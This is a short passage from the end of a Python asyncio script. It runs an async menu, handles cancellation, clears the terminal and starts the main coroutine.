        await menu()  # Call the menu asynchronously
    except asyncio.CancelledError:
        print("Event loop was canceled or the program is exiting.")
        await menu()
        
        
    finally:
        os.system('clear')
        
        

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except RuntimeError as e:
        print(f"Error: {e}")
